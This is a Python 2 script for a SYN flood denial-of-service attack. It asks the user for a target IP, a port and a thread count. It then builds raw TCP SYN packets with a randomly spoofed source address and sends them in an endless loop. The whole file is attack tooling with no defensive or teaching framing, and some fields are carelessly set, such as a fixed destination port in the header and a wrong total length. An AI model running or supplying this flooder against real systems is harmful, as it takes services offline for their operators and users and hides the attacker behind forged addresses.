import threading
import socket
import time
import os
import sys
from socket import htons, inet_aton
from struct import pack, unpack
from random import random, randrange

class synflood(threading.Thread):
    def __init__(self, target_ip,ip,tgt_port):
        threading.Thread.__init__(self)
        self.ip=ip
        self.tgt_ip=target_ip
        self.tgt_port=tgt_port
        #use SOCK_RAW to build own packet
        self.synsock=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        # set IP_HDRINCL to add fake IPaddr
        self.synsock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
    

    def checksum1(self,msg):
        s = 0
        for i in range(0, len(msg), 2):
                w = (ord(msg[i])) + ((ord(msg[i+1]) )<< 8 )
                s = s + w
        s = s + (s >> 16)
        s = ~s & 0xffff
        return s

    def build_packet(self):
    #IP header
        Version=4 #4bit
        IHL=5 #4bit
        Version_IHL = (Version << 4) +IHL
        tos=0 #Type of service 8bit
        tl=4 #total length (16bit)
        id=0 #(16bit)
        frag_off=0# Fragment Offset 13bit
        ttl=64 #time to live 
        protocol=socket.IPPROTO_TCP#(8bit)
        check=0 #checksum (16bit)
        s_addr=inet_aton(self.ip)
        d_addr=inet_aton(self.tgt_ip)
	
        ip_header = pack('!BBHHHBBH4s4s',Version_IHL,tos,tl,id,frag_off,ttl,protocol,check,s_addr,d_addr)
           
    #TCP header
        source = 59796 # 16
        dest = 8016 #16
        seq = 0 #32
        ack_seq = 0#  32 acknowledgement number
        doff = 5 #4 data offset
        #FLAG bit
        urg = 0 #URG urgent pointer
        ack = 0 # ACK
        psh = 0 # PSH
        rst = 0 #
        syn = 1 #
        fin = 0 #
        window = htons(5840) #16 window size
        check = 0 # 16 TCP check sum
        urg_prt = 0 #16 urgent pointer 
        offset_res = (doff << 4)+0 
        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5) #6
        
        tcp_header=pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,check,urg_prt)
        src_addr = inet_aton(self.ip)
        dst_addr = inet_aton(self.tgt_ip)
        place = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psd_header = pack('!4s4sBBH',src_addr,dst_addr,place,protocol,tcp_length);
        psd_header = psd_header + tcp_header;
        tcp_checksum = self.checksum1(psd_header)
        tcp_header = pack('!HHLLBBH',source,dest,seq,ack_seq,offset_res,tcp_flags,window)+ pack('H' , tcp_checksum) + pack('!H' ,urg_prt)
    #packet
        packet = ip_header + tcp_header
        return packet

    def run(self):
            packet=self.build_packet()
            try:
                self.synsock.sendto(packet,(self.tgt_ip,self.tgt_port))
            except KeyboardInterrupt:
                print("[-] Canceled by user")
                sys.exit()
            except Exception as e:
                print(e)

            finally:
                self.synsock.close()
def fake_ip():
    skip = '127'
    rand = [0]*4
    for x in range(4):
        rand[x] = randrange(0,256)
    if rand[0] == skip:
        fake_ip()
    fkip = '%d.%d.%d.%d' % (rand[0],rand[1],rand[2],rand[3])
    return fkip


print("##Enter the number of threads:")
T=input()
print("")
print("##Enter the target IP:")
tgt=raw_input()
print("")
print("##Enter the target Port:")
tgt_port=input()
print("")
ip = fake_ip()
#ip="233.233.233.233"
print("##start to send info...")
print("##PS:Enter Ctrl+C to stop")
print("")
while 1:
    try:
        i=0
        while i<T:
            thread=synflood(tgt,ip,tgt_port)
            thread.setDaemon(True)
            thread.start()
            thread.join()
            i=i+1
    except KeyboardInterrupt:
        print('[-] Canceled by user')
        break
